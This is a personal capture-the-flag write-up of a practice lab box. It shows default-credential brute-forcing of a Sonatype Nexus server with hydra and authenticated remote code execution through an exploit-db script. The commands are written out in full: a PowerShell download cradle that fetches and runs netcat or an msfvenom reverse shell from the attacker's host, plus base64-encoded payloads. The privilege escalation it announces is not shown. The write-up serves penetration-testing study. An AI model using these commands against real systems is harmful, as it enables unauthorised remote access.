This lab involves exploiting Sonatype Nexus 3.21.0-05 for authenticated remote code execution and using the SMBGhost vulnerability to escalate privileges. Learners will craft payloads to gain initial access and leverage an unpatched SMB service to obtain a SYSTEM shell. The lab highlights web application vulnerabilities and critical privilege escalation techniques.

- Enumerate services to identify the Sonatype Nexus application on port 8081 and confirm its version.
- Use default credentials to access the application and execute commands to deploy a reverse shell.
- Analyze installed patches and running services to confirm vulnerability to SMBGhost (CVE-2020-0796).
- Deploy a custom SMBGhost exploit to elevate privileges to SYSTEM.
- Understand the importance of patching critical vulnerabilities and securing default credentials.

ok lets get crackin

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial 192.168.60.61
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 21:13 +0000
Nmap scan report for 192.168.60.61
Host is up (0.00088s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8081/tcp open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
|_http-title: Nexus Repository Manager
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-04T21:13:28
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.62 seconds

```

okay. FTP, SonaType on port `8081`. let's search exploit-db for ...what version is it running, I wonder.

```
Sonatype
Sonatype Nexus Repository Manager OSS 3.21.0-05
```

rce auth'd
https://www.exploit-db.com/exploits/49385

cool. now we just need to log in first to get RCE.

- Use default credentials to access the application and execute commands to deploy a reverse shell.

ok.

`admin:admin123`

nope.

let's uh.

 `/opt/sonatype-work/nexus3/admin.password`

try to steal this.

path traversal
https://www.exploit-db.com/exploits/52101

ok. a bit stuck. 8/30 boxes in, let's use a guide.

https://banua.medium.com/proving-grounds-billyboss-oscp-prep-2025-practice-10-8bbf7ed4dc0f

okay, so he uses a wordlist.

```sh
cewl --lowercase http://BILLYBOSS:8081/ | grep -v CeWL > wordlists.txt

hydra -I -f -L wordlists.txt -P wordlists.txt "http-post-form://BILLYBOSS:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403"

# [8081][http-post-form] host: BILLYBOSS   login: nexus   password: nexus
```

cool, the cred is `nexus:nexus`.

now we can use this RCE auth'd vuln

https://www.exploit-db.com/exploits/49385


```bash
# on attacker
ip a|grep 192
nc -nvlp 4444
```

```python
# 49385.py start of file

URL='http://BILLYBOSS:8081'
CMD = 'powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe; C:\\Windows\\Temp\\nc.exe 192.168.49.51 4444 -e cmd.exe"'
USERNAME='nexus'
PASSWORD='nexus'

```

 Option A — PowerShell download cradle (nc.exe)                                                                               
                                                                                                                              
 1. Copy nc.exe to your serving dir and start a web server:                                                                   
```
cp /usr/share/windows-binaries/nc.exe .
python3 -m http.server 80
```
                
1. Start your listener: `nc -lvnp 4444`
2. Update the script: 

```
CMD = 'powershell -c "Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe; C:\\Windows\\Temp\\nc.exe 192.168.49.51 4444 -e cmd.exe"'
```

```
 echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe        
 192.168.49.51 4444 -e cmd.exe' | iconv -t UTF-16LE | base64 -w 0
```

output:

```
SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAG4AYwAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAACgBjAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAAoAYwAuAGUAeABlACAAIAAgACAAIAAKACAAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA
```


```
CMD = 'powershell -EncodedCommand <PASTE_BASE64_HERE>'


CMD = 'powershell -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAG4AYwAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAACgBjAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAAoAYwAuAGUAeABlACAAIAAgACAAIAAKACAAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxACAANAA0ADQANAAgAC0AZQAgAGMAbQBkAC4AZQB4AGUA'
```

```sh
echo -n 'ping -n 1 192.168.49.51' | iconv -t UTF-16LE | base64 -w 0

# cABpAG4AZwAgAC0AbgAgADEAIAAxADkAMgAuADEANgA4AC4ANAA5AC4ANQAxAA==

sudo tcpdump -i any icmp
(ping works)

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=4444 -f exe -o shell.exe


echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/shell.exe -OutFile C:\Windows\Temp\s.exe; C:\Windows\Temp\s.exe' | iconv -t UTF-16LE | base64 -w 0

# SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA==

# great! we have non-root shell.
```

working steps:

```sh
python3 -m http.server 80

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.51 LPORT=4444 -f exe -o shell.exe

echo -n 'Invoke-WebRequest -Uri http://192.168.49.51/shell.exe -OutFile C:\Windows\Temp\s.exe; C:\Windows\Temp\s.exe' | iconv -t UTF-16LE | base64 -w 0

# SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA==

```

```python
URL='http://BILLYBOSS:8081'
CMD = 'powershell -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADUAMQAvAHMAaABlAGwAbAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABzAC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGUAbQBwAFwAcwAuAGUAeABlAA=="'
USERNAME='nexus'
PASSWORD='nexus'
```

```bash
python 49385.py
```

```bash
C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami
whoami
billyboss\nathan
```